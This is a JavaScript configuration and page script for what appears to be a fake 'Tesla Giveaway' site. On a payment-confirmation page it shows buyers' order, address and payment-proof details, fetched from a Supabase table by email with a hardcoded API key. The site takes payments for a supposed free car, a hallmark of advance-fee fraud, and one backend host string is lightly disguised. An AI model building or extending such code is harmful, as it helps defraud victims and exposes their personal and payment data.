// Tesla Giveaway — Backend API Configuration
// =============================================
(function configureTeslaApiBase(global) {
  'use strict';

  var deployedApiBase = '__TESLA_API_BASE__';
  var hasInjectedApiBase = deployedApiBase.indexOf('__') !== 0;
  var supabaseApiBase = 'https://puebwzumwqizgbmksrpq+qizgbmksrpq.supabase.co/functions/v1/tesla-api/api'.replace('+','');

  function normalizeApiBase(value) { return String(value || '').trim().replace(/\/+$/, ''); }
  global.TESLA_API_BASE = normalizeApiBase(global.TESLA_API_BASE || (hasInjectedApiBase ? deployedApiBase : supabaseApiBase));

  global.TESLA_CURRENCIES = [
    {code:'USD',symbol:'$',label:'US Dollar'},{code:'EUR',symbol:'€',label:'Euro'},{code:'GBP',symbol:'£',label:'British Pound'},
    {code:'CAD',symbol:'C$',label:'Canadian Dollar'},{code:'AUD',symbol:'A$',label:'Australian Dollar'},{code:'NGN',symbol:'₦',label:'Nigerian Naira'},
    {code:'GHS',symbol:'₵',label:'Ghanaian Cedi'},{code:'KES',symbol:'KSh',label:'Kenyan Shilling'},{code:'ZAR',symbol:'R',label:'South African Rand'},
    {code:'INR',symbol:'₹',label:'Indian Rupee'},{code:'JPY',symbol:'¥',label:'Japanese Yen'},{code:'CNY',symbol:'¥',label:'Chinese Yuan'},
    {code:'CHF',symbol:'Fr',label:'Swiss Franc'},{code:'AED',symbol:'AED',label:'UAE Dirham'},{code:'BRL',symbol:'R$',label:'Brazilian Real'}
  ];
  global.teslaCurrencySymbol = function(code){ var list=global.TESLA_CURRENCIES||[]; for(var i=0;i<list.length;i++) if(list[i].code===code)return list[i].symbol; return code||'$'; };

  if (!/payment-confirmation\.html$/i.test(global.location.pathname)) return;

  var vehicleImages = {
    cybertruck:'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/cybertruck-main.png',
    modely:'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modely-main.png',
    models:'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/models-main.png',
    model3:'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/model3-main.png',
    modelx:'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modelx-main.png'
  };

  function el(id){return document.getElementById(id);}
  function cleanKey(v){return String(v||'').toLowerCase().replace(/[^a-z0-9]/g,'');}
  function setText(id,v){var n=el(id); if(n && v!==undefined && v!==null && String(v).trim()!=='') n.textContent=String(v);}

  function storedOrder(){ try{return JSON.parse(localStorage.getItem('tesla_last_order')||'null');}catch(e){return null;} }

  function vehicleKey(){
    var name=el('vehicleName');
    var text=String(name&&name.textContent||'').replace(/^Tesla\s*/i,'').trim();
    var key=cleanKey(text);
    // Do not trust the initial Model S placeholder. Wait for the real order data.
    if(key && key!=='models' && key!=='models') return key;
    var o=storedOrder();
    var c=o&&o.selectedCar;
    return cleanKey(c&&(c.id||c.model||c.name));
  }

  function syncVehicleImage(){
    var img=el('vehicleImg'); if(!img)return;
    // Never allow the HTML placeholder (Model S) to be painted while the order is loading.
    img.style.visibility='hidden';
    var key=vehicleKey();
    var expected=vehicleImages[key];
    if(!expected)return;
    if(img.getAttribute('data-real-image')===expected && img.complete && img.naturalWidth>0){img.style.visibility='visible';return;}
    img.setAttribute('data-real-image',expected);
    var pre=new Image();
    pre.onload=function(){if(img.getAttribute('data-real-image')===expected){img.src=expected;img.style.visibility='visible';}};
    pre.onerror=function(){img.style.visibility='hidden';};
    pre.src=expected;
  }

  function removeHeaderLabel(){var n=document.querySelector('.pc-nav-label');if(n)n.remove();}
  function removeTrackButton(){var n=document.getElementById('trackBtn');if(n)n.remove();}

  function value(obj, aliases){
    if(!obj||typeof obj!=='object')return null;
    var wanted={}; aliases.forEach(function(a){wanted[cleanKey(a)]=1;});
    var found=null;
    function walk(o,d){
      if(found!==null||!o||typeof o!=='object'||d>5)return;
      Object.keys(o).some(function(k){var v=o[k]; if(wanted[cleanKey(k)]&&v!==null&&v!==undefined&&String(v).trim()!==''){found=v;return true;} if(v&&typeof v==='object')walk(v,d+1); return found!==null;});
    }
    walk(obj,0); return found;
  }

  function applyPaymentDetails(data){
    if(!data)return;
    var status=value(data,['payment_status','paymentStatus','proof_status','proofStatus']);
    var submitted=value(data,['payment_submitted_at','paymentSubmittedAt','proof_submitted_at','proofSubmittedAt','submitted_at','submittedAt','created_at']);
    var method=value(data,['payment_method','paymentMethod','proof_method','proofMethod','method']);
    var proof=value(data,['payment_proof_url','paymentProofUrl','proof_url','proofUrl','receipt_url','receiptUrl']);
    if(status) setText('proofStatus',String(status).charAt(0).toUpperCase()+String(status).slice(1));
    if(submitted){var d;try{d=new Date(submitted);setText('proofDate',isNaN(d.getTime())?submitted:d.toLocaleString('en-US',{month:'short',day:'numeric',year:'numeric',hour:'numeric',minute:'2-digit'}));}catch(e){setText('proofDate',submitted);}}
    if(method)setText('proofMethod',method);
    if(proof){var w=el('proofImgWrap'),i=el('proofImg');if(w&&i){i.src=String(proof);w.style.display='block';}}
  }

  var SB_URL='https://puebwzumwqizgbmksrpq.supabase.co';
  var SB_KEY='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB1ZWJ3enVtd3FpemdibWtzcnBxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU5ODEyMjYsImV4cCI6MjA2MTU1NzIyNn0.kfup1Lsb8vnvKLjAH0r-SM5mqLYMttOzQsN7YT6ISrw';
  var SB_HEADERS={'apikey':SB_KEY,'Authorization':'Bearer '+SB_KEY};

  function fetchProof(email){
    if(!email||!global.fetch)return;
    var url=SB_URL+'/rest/v1/payment_proofs?select=*&customer_email=eq.'+encodeURIComponent(email)+'&order=created_at.desc&limit=1';
    fetch(url,{headers:SB_HEADERS}).then(function(r){return r.ok?r.json():[];}).then(function(rows){if(rows&&rows[0])applyPaymentDetails(rows[0]);}).catch(function(){});
  }

  function applyLocalOrder(){
    var o=storedOrder(); if(!o)return;
    var pm=o.paymentMethod||{},dm=o.deliveryMethod||{},dd=o.deliveryDetails||{},u=o.user||{};
    if(pm.name||pm.label||pm.type)setText('paymentMethod',pm.name||pm.label||pm.type);
    if(dm.name||dm.label)setText('deliveryMethod',dm.name||dm.label);
    if(o.orderId)setText('orderId',o.orderId);
    if(o.trackingNumber)setText('trackingNum',o.trackingNumber);
    if(o.orderDate)setText('orderDate',new Date(o.orderDate).toLocaleDateString('en-US',{month:'short',day:'numeric',year:'numeric'}));
    if(o.estimatedDelivery)setText('estDelivery',o.estimatedDelivery);
    if(dd.fullName||dd.name)setText('delName',dd.fullName||dd.name);
    if(dd.address||dd.street)setText('delAddr',dd.address||dd.street);
    if(dd.city)setText('delCity',dd.city);
    if(dd.state||dd.zipCode||dd.zip)setText('delStateZip',[dd.state,dd.zipCode||dd.zip].filter(Boolean).join(' '));
    if(dd.country)setText('delCountry',dd.country);
    if(u.firstName||u.lastName)setText('custName',[u.firstName,u.lastName].filter(Boolean).join(' '));
    if(u.email)setText('custEmail',u.email);
    if(u.phone||dd.phone)setText('custPhone',u.phone||dd.phone);
    fetchProof(u.email||o.customerEmail||o.email);
  }

  function install(){
    removeHeaderLabel();removeTrackButton();applyLocalOrder();syncVehicleImage();
    var name=el('vehicleName');
    if(global.MutationObserver&&name){new MutationObserver(function(){syncVehicleImage();}).observe(name,{childList:true,characterData:true,subtree:true});}
    var body=document.body;
    if(global.MutationObserver&&body){new MutationObserver(function(){removeHeaderLabel();removeTrackButton();syncVehicleImage();}).observe(body,{childList:true,subtree:true});}
    var tries=0;
    var timer=setInterval(function(){
      tries++;removeHeaderLabel();removeTrackButton();applyLocalOrder();syncVehicleImage();
      // Once the inline confirmation script has loaded the authenticated user, fetch the real proof by email.
      if(global._userData&&global._userData.email)fetchProof(global._userData.email);
      if(tries>=20)clearInterval(timer);
    },500);
  }

  if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',install,{once:true});else install();
})(window);